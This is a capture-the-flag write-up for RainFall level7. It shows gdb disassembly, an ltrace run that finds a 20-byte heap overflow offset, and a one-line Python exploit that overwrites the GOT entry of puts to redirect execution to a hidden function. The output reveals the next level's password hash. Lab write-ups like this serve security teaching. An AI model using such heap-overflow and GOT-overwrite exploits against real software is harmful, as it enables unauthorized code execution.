_basic test_
```
level7@RainFall:~$ ls
level7
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 test
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 test test
~~

```

_using gdb_
```
gdb ./level7
  (gdb) disassemble main
  Dump of assembler code for function main:
    0x08048521 <+0>:     push   %ebp
    0x08048522 <+1>:     mov    %esp,%ebp
    0x08048524 <+3>:     and    $0xfffffff0,%esp
    0x08048527 <+6>:     sub    $0x20,%esp
    0x0804852a <+9>:     movl   $0x8,(%esp)
    0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
    0x08048536 <+21>:    mov    %eax,0x1c(%esp)
    0x0804853a <+25>:    mov    0x1c(%esp),%eax       
    0x0804853e <+29>:    movl   $0x1,(%eax)
    0x08048544 <+35>:    movl   $0x8,(%esp)
    0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
    0x08048550 <+47>:    mov    %eax,%edx
    0x08048552 <+49>:    mov    0x1c(%esp),%eax
    0x08048556 <+53>:    mov    %edx,0x4(%eax)
    0x08048559 <+56>:    movl   $0x8,(%esp)
    0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
    0x08048565 <+68>:    mov    %eax,0x18(%esp)
    0x08048569 <+72>:    mov    0x18(%esp),%eax
    0x0804856d <+76>:    movl   $0x2,(%eax)
    0x08048573 <+82>:    movl   $0x8,(%esp)
    0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
    0x0804857f <+94>:    mov    %eax,%edx
    0x08048581 <+96>:    mov    0x18(%esp),%eax
    0x08048585 <+100>:   mov    %edx,0x4(%eax)
    0x08048588 <+103>:   mov    0xc(%ebp),%eax
    0x0804858b <+106>:   add    $0x4,%eax
    0x0804858e <+109>:   mov    (%eax),%eax
    0x08048590 <+111>:   mov    %eax,%edx
    0x08048592 <+113>:   mov    0x1c(%esp),%eax
    0x08048596 <+117>:   mov    0x4(%eax),%eax
    0x08048599 <+120>:   mov    %edx,0x4(%esp)
    0x0804859d <+124>:   mov    %eax,(%esp)
    0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
    0x080485a5 <+132>:   mov    0xc(%ebp),%eax
    0x080485a8 <+135>:   add    $0x8,%eax
    0x080485ab <+138>:   mov    (%eax),%eax
    0x080485ad <+140>:   mov    %eax,%edx
    0x080485af <+142>:   mov    0x18(%esp),%eax
    0x080485b3 <+146>:   mov    0x4(%eax),%eax
    0x080485b6 <+149>:   mov    %edx,0x4(%esp)
    0x080485ba <+153>:   mov    %eax,(%esp)
    0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
    0x080485c2 <+161>:   mov    $0x80486e9,%edx
    0x080485c7 <+166>:   mov    $0x80486eb,%eax
    0x080485cc <+171>:   mov    %edx,0x4(%esp)
    0x080485d0 <+175>:   mov    %eax,(%esp)
    0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
    0x080485d8 <+183>:   mov    %eax,0x8(%esp)
    0x080485dc <+187>:   movl   $0x44,0x4(%esp)
    0x080485e4 <+195>:   movl   $0x8049960,(%esp)
    0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
    0x080485f0 <+207>:   movl   $0x8048703,(%esp)
    0x080485f7 <+214>:   call   0x8048400 <puts@plt>
    0x080485fc <+219>:   mov    $0x0,%eax
    0x08048601 <+224>:   leave
    0x08048602 <+225>:   ret
  End of assembler dump.

  (gdb) info functions
  All defined functions:

  Non-debugging symbols:
    0x0804836c  _init
    0x080483b0  printf
    0x080483b0  printf@plt
    0x080483c0  fgets
    0x080483c0  fgets@plt
    0x080483d0  time
    0x080483d0  time@plt
    0x080483e0  strcpy
    0x080483e0  strcpy@plt
    0x080483f0  malloc
    0x080483f0  malloc@plt
    0x08048400  puts
    0x08048400  puts@plt
    0x08048410  __gmon_start__
    0x08048410  __gmon_start__@plt
    0x08048420  __libc_start_main
    0x08048420  __libc_start_main@plt
    0x08048430  fopen
    0x08048430  fopen@plt
    0x08048440  _start
    0x08048470  __do_global_dtors_aux
    0x080484d0  frame_dummy
    0x080484f4  m
    0x08048521  main
    0x08048610  __libc_csu_init
    0x08048680  __libc_csu_fini
    0x08048682  __i686.get_pc_thunk.bx
    0x08048690  __do_global_ctors_aux
    0x080486bc  _fini
  End of assembler dump.

  (gdb) disassemble m
  Dump of assembler code for function m:
    0x080484f4 <+0>:     push   %ebp
    0x080484f5 <+1>:     mov    %esp,%ebp
    0x080484f7 <+3>:     sub    $0x18,%esp
    0x080484fa <+6>:     movl   $0x0,(%esp)
    0x08048501 <+13>:    call   0x80483d0 <time@plt>
    0x08048506 <+18>:    mov    $0x80486e0,%edx
    0x0804850b <+23>:    mov    %eax,0x8(%esp)
    0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
    0x08048517 <+35>:    mov    %edx,(%esp)
    0x0804851a <+38>:    call   0x80483b0 <printf@plt>
    0x0804851f <+43>:    leave
    0x08048520 <+44>:    ret
  End of assembler dump.

  (gdb) info variables
  All defined variables:

  Non-debugging symbols:
  0x080486d8  _fp_hw
  0x080486dc  _IO_stdin_used
  0x08048824  __FRAME_END__
  0x08049828  __CTOR_LIST__
  0x08049828  __init_array_end
  0x08049828  __init_array_start
  0x0804982c  __CTOR_END__
  0x08049830  __DTOR_LIST__
  0x08049834  __DTOR_END__
  0x08049838  __JCR_END__
  0x08049838  __JCR_LIST__
  0x0804983c  _DYNAMIC
  0x08049908  _GLOBAL_OFFSET_TABLE_
  0x08049938  __data_start
  0x08049938  data_start
  0x0804993c  __dso_handle
  0x08049940  completed.6159
  0x08049944  dtor_idx.6161
  0x08049960  c


```
_main is calling malloc, strcpy, fopen, fget and puts.
m is never called but load a global var and print it_

_there is a string with the pass path inside_
```
  0x080485c7 <+166>:   mov    $0x80486eb,%eax
  
  (gdb) x/s 0x80486eb
  0x80486eb: "/home/user/level8/.pass"
```

_for the buffer offset, we have 2 strcpy call_
```
  0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
  0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
```

_we will use the same method as previous_
```
  $> ltrace ./level7  `echo -e "import string\nprint ''.join([char * 4 for char in string.ascii_letters])" | python` "teststring"
__libc_start_main(0x8048521, 3, 0xbffff704, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                          = 0x0804a008
malloc(8)                                                                                          = 0x0804a018
malloc(8)                                                                                          = 0x0804a028
malloc(8)                                                                                          = 0x0804a038
strcpy(0x0804a018, "aaaabbbbccccddddeeeeffffgggghhhh"...)                                          = 0x0804a018
strcpy(0x66666666, "teststring" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
> 0x66666666 is ascii value of ffff

_we can do 4*(6-1) = 20 so buffer offset is 20_

_now we need the adress of some functions_
> puts 0x08049928
> adress of m 0x080484f4

```
  $> ./level7 $(python -c 'print("\x90"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')

  5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1649074015
```
>**DONE**

